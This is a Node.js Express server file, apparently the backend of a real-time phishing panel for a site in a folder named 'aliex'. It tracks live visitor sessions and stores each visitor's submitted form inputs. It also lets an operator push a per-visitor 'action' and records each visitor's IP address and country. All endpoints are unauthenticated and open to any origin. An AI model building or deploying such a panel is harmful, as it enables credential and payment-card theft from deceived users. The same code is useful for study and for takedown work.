const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4173;
const DIST = '/home/ubuntu/aliex/dist';
const DATA_DIR = '/home/ubuntu/aliex';

app.use(express.json());

// CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  next();
});

// ── Helper: read/write JSON files ─────────────────────────────────────────────
const readJson = (file) => {
  const p = path.join(DATA_DIR, file);
  if (!fs.existsSync(p)) return {};
  try { return JSON.parse(fs.readFileSync(p, 'utf8')); } catch { return {}; }
};
const writeJson = (file, data) => {
  fs.writeFileSync(path.join(DATA_DIR, file), JSON.stringify(data, null, 2));
};

// ── Sessions ──────────────────────────────────────────────────────────────────
app.get('/api/sessions', (req, res) => {
  const sessions = readJson('sessions.json');
  const now = Date.now();
  const active = {};
  Object.entries(sessions).forEach(([id, data]) => {
    if (now - data.lastSeen < 30000) active[id] = data;
  });
  writeJson('sessions.json', active);
  res.json(active);
});

app.post('/api/sessions/:id', (req, res) => {
  const sessions = readJson('sessions.json');
  sessions[req.params.id] = { ...req.body, lastSeen: Date.now() };
  writeJson('sessions.json', sessions);
  res.json({ success: true });
});

app.delete('/api/sessions/:id', (req, res) => {
  const sessions = readJson('sessions.json');
  delete sessions[req.params.id];
  writeJson('sessions.json', sessions);
  res.json({ success: true });
});

// ── Actions ───────────────────────────────────────────────────────────────────
app.get('/api/actions/:id', (req, res) => {
  const actions = readJson('actions.json');
  res.json({ action: actions[req.params.id] || 'normal' });
});

app.post('/api/actions/:id', (req, res) => {
  const actions = readJson('actions.json');
  actions[req.params.id] = req.body.action;
  writeJson('actions.json', actions);
  res.json({ success: true });
});

// ── Inputs ────────────────────────────────────────────────────────────────────
app.get('/api/inputs/:id', (req, res) => {
  const inputs = readJson('inputs.json');
  res.json(inputs[req.params.id] || {});
});

app.post('/api/inputs/:id', (req, res) => {
  const inputs = readJson('inputs.json');
  inputs[req.params.id] = req.body;
  writeJson('inputs.json', inputs);
  res.json({ success: true });
});

// ── Geo IP lookup (server-side — reads real visitor IP from headers) ────────────
const COUNTRY_CODES = {
  AF:'Afghanistan',AL:'Albania',DZ:'Algeria',AD:'Andorra',AO:'Angola',AG:'Antigua and Barbuda',
  AR:'Argentina',AM:'Armenia',AU:'Australia',AT:'Austria',AZ:'Azerbaijan',BS:'Bahamas',BH:'Bahrain',
  BD:'Bangladesh',BB:'Barbados',BY:'Belarus',BE:'Belgium',BZ:'Belize',BJ:'Benin',BT:'Bhutan',
  BO:'Bolivia',BA:'Bosnia and Herzegovina',BW:'Botswana',BR:'Brazil',BN:'Brunei',BG:'Bulgaria',
  BF:'Burkina Faso',BI:'Burundi',CV:'Cabo Verde',KH:'Cambodia',CM:'Cameroon',CA:'Canada',
  CF:'Central African Republic',TD:'Chad',CL:'Chile',CN:'China',CO:'Colombia',KM:'Comoros',
  CG:'Congo',CR:'Costa Rica',HR:'Croatia',CU:'Cuba',CY:'Cyprus',CZ:'Czech Republic',
  DK:'Denmark',DJ:'Djibouti',DM:'Dominica',DO:'Dominican Republic',EC:'Ecuador',EG:'Egypt',
  SV:'El Salvador',GQ:'Equatorial Guinea',ER:'Eritrea',EE:'Estonia',SZ:'Eswatini',ET:'Ethiopia',
  FJ:'Fiji',FI:'Finland',FR:'France',GA:'Gabon',GM:'Gambia',GE:'Georgia',DE:'Germany',
  GH:'Ghana',GR:'Greece',GD:'Grenada',GT:'Guatemala',GN:'Guinea',GW:'Guinea-Bissau',GY:'Guyana',
  HT:'Haiti',HN:'Honduras',HU:'Hungary',IS:'Iceland',IN:'India',ID:'Indonesia',IR:'Iran',
  IQ:'Iraq',IE:'Ireland',IL:'Israel',IT:'Italy',JM:'Jamaica',JP:'Japan',JO:'Jordan',
  KZ:'Kazakhstan',KE:'Kenya',KI:'Kiribati',KW:'Kuwait',KG:'Kyrgyzstan',LA:'Laos',LV:'Latvia',
  LB:'Lebanon',LS:'Lesotho',LR:'Liberia',LY:'Libya',LI:'Liechtenstein',LT:'Lithuania',
  LU:'Luxembourg',MG:'Madagascar',MW:'Malawi',MY:'Malaysia',MV:'Maldives',ML:'Mali',MT:'Malta',
  MH:'Marshall Islands',MR:'Mauritania',MU:'Mauritius',MX:'Mexico',FM:'Micronesia',MD:'Moldova',
  MC:'Monaco',MN:'Mongolia',ME:'Montenegro',MA:'Morocco',MZ:'Mozambique',MM:'Myanmar',
  NA:'Namibia',NR:'Nauru',NP:'Nepal',NL:'Netherlands',NZ:'New Zealand',NI:'Nicaragua',
  NE:'Niger',NG:'Nigeria',NO:'Norway',OM:'Oman',PK:'Pakistan',PW:'Palau',PA:'Panama',
  PG:'Papua New Guinea',PY:'Paraguay',PE:'Peru',PH:'Philippines',PL:'Poland',PT:'Portugal',
  QA:'Qatar',RO:'Romania',RU:'Russia',RW:'Rwanda',KN:'Saint Kitts and Nevis',LC:'Saint Lucia',
  VC:'Saint Vincent and the Grenadines',WS:'Samoa',SM:'San Marino',ST:'Sao Tome and Principe',
  SA:'Saudi Arabia',SN:'Senegal',RS:'Serbia',SC:'Seychelles',SL:'Sierra Leone',SG:'Singapore',
  SK:'Slovakia',SI:'Slovenia',SB:'Solomon Islands',SO:'Somalia',ZA:'South Africa',SS:'South Sudan',
  ES:'Spain',LK:'Sri Lanka',SD:'Sudan',SR:'Suriname',SE:'Sweden',CH:'Switzerland',SY:'Syria',
  TW:'Taiwan',TJ:'Tajikistan',TZ:'Tanzania',TH:'Thailand',TL:'Timor-Leste',TG:'Togo',
  TO:'Tonga',TT:'Trinidad and Tobago',TN:'Tunisia',TR:'Turkey',TM:'Turkmenistan',TV:'Tuvalu',
  UG:'Uganda',UA:'Ukraine',AE:'United Arab Emirates',GB:'United Kingdom',US:'United States',
  UY:'Uruguay',UZ:'Uzbekistan',VU:'Vanuatu',VE:'Venezuela',VN:'Vietnam',YE:'Yemen',
  ZM:'Zambia',ZW:'Zimbabwe'
};

const https = require('https');
const fetchJson = (url) => new Promise((resolve, reject) => {
  https.get(url, { headers: { 'User-Agent': 'curl/7.81.0' } }, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => { try { resolve(JSON.parse(data)); } catch { reject(new Error('parse error')); } });
  }).on('error', reject);
});

app.get('/api/geo', async (req, res) => {
  res.setHeader('Cache-Control', 'no-store');
  // Get real visitor IP from proxy headers
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
    || req.headers['x-real-ip']
    || req.socket.remoteAddress
    || 'Unknown';

  // Vercel header (most reliable on Vercel)
  const vercelCC = req.headers['x-vercel-ip-country'];
  if (vercelCC && COUNTRY_CODES[vercelCC]) {
    return res.json({ ip, country: COUNTRY_CODES[vercelCC], source: 'vercel-header' });
  }

  // Cloudflare header
  const cfCC = req.headers['cf-ipcountry'];
  if (cfCC && cfCC !== 'XX' && COUNTRY_CODES[cfCC]) {
    return res.json({ ip, country: COUNTRY_CODES[cfCC], source: 'cf-header' });
  }

  // Server-side lookup — request comes from real user IP
  const lookupIp = ip.replace('::ffff:', '');
  if (lookupIp && lookupIp !== 'Unknown' && lookupIp !== '127.0.0.1') {
    try {
      const d = await fetchJson(`https://ipwho.is/${lookupIp}`);
      if (d.success && d.country) return res.json({ ip: lookupIp, country: d.country, source: 'ipwho' });
    } catch {}
    try {
      const d2 = await fetchJson(`https://ipapi.co/${lookupIp}/json/`);
      if (!d2.error && d2.country_name) return res.json({ ip: lookupIp, country: d2.country_name, source: 'ipapi' });
    } catch {}
  }

  return res.json({ ip: lookupIp || 'Unknown', country: 'Unknown', source: 'fallback' });
});

// ── Static files ──────────────────────────────────────────────────────────────
app.use(express.static(DIST));

// SPA fallback - use middleware to catch all non-API routes
app.use((req, res) => {
  res.sendFile(path.join(DIST, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port ' + PORT);
});
